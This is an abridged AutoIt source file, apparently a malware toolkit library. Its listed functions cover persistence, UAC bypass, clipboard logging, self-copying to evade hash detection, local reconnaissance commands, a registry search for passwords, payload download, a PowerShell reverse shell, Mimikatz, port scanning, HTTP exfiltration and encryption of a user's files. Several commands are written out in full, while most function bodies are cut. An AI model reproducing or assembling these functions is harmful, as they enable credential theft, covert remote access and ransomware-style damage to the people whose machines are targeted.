...
Func SetPersistent4CurrentUser();DESCRIPTION:Get the exe persistent for current user
...
Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESCRIPTION:Run powershell command with elevated permissions UAC
...
Func RunElevatedNoUAC($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESCRIPTION:Run powershell command with elevated permissions WITHOUT UAC
   ;WORK IN Progress;
...
Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump");DESCRIPTION:Log to file the data stored in the clipboard
   $buffer=""
   While 1
	  if $timeOut > 0 Then
		 $Data = ClipGet()
...
Func Log2File($log, $pathFile);DESCRIPTION:
...
Func DetectMouseMoving();DESCRIPTION:
...
Func RandomString();DESCRIPTION:random string generator
   $out = ""
   Dim $buffer[3]
   $digits = 8
   For $i = 1 To $digits
...
Func CopyTempRun($newName = RandomString());DESCRIPTION:copy myself into temp changing hash
...
Func Move2Temp($newName = RandomString());DESCRIPTION:if it's not running from temp, drop child to temp with different hash
...
Func administrators();DESCRIPTION:enumerated administrative users
   return function_wrapper("net localgroup administrators")
EndFunc

Func systeminfo();DESCRIPTION:get sys info
   return function_wrapper("systeminfo")
EndFunc

Func updates_installed();DESCRIPTION:list of all installed Windows and software updates applied to that computer
   return function_wrapper("wmic qfe list full")
EndFunc

Func shared();DESCRIPTION:get a list of shared resources
   Return function_wrapper("wmic share get")
EndFunc

Func searchPasswordsOnRegistry();DESCRIPTION:search for password in registry
   Return function_wrapper("reg query HKCU /f password /t REG_SZ /s")
EndFunc

Func whoami();DESCRIPTION:who am I?
   $sReturn = function_wrapper("whoami")
   Return StringSplit(StringRegExpReplace(StringUpper($sReturn), '\n|\r', ''),"\")[2];
EndFunc

Func AmIusername($username);DESCRIPTION:Am I username?
   $sReturn = function_wrapper("whoami")
...
Func numberOfLogins($user);DESCRIPTION:get number of logins for specific user
   return StringReplace(StringSplit(function_wrapper("wmic netlogin where (name like '%" & $user & "') get numberoflogons"), @CRLF)[4], " ", "")
EndFunc

Func nslookup($address);DESCRIPTION:run nslookup
...
Func function_wrapper($command);DESCRIPTION:
   Local $sOutput = ""
...
Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:download a file from an http server - path: C:\Users\name\AppData\Local\Temp\drop.tmp
   InetGet($sURL, $FileName, 1, 1)
EndFunc

Func PopUp();DESCRIPTION:PopUp using powershell
...
Func ReverseShell($RemoteIp, $RemotePort);DESCRIPTION:reverse shell using powershell
...
Func Mimikatz();DESCRIPTION:Mimikatz
...
Func InternetCheck();DESCRIPTION:check if internet is up
...
Func ReadRemoteVar($url);DESCRIPTION:read remote http/s page
   return _INetGetSource($url) & @crlf
EndFunc

Func TCPscanner($ip,$port);DESCRIPTION:TCP scanner;
   TCPStartup()
...
Func HttpPost($ip, $tag, $sData = "");DESCRIPTION:Send data over Http
...
Func EncryptFiles($password,$folder);DESCRIPTION:Encrypt the files in a directory - ex:EncryptFiles("password","Documents")
...
Func DecryptFiles($password,$folder);DESCRIPTION:Decrypt the files in a directory - ex:Decrypt("password","Documents")
  ; List all the files in the directory
	$filePath = _PathFull($folder,@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
...
Func ListDesktopFiles();DESCRIPTION:get list of the files in the Desktop
   local $buffer = ""
...
Func ReadFile($sFilePath);DESCRIPTION:open a file and get content to a variable.
...
Func Unzip($source,$destination);DESCRIPTION:unzip
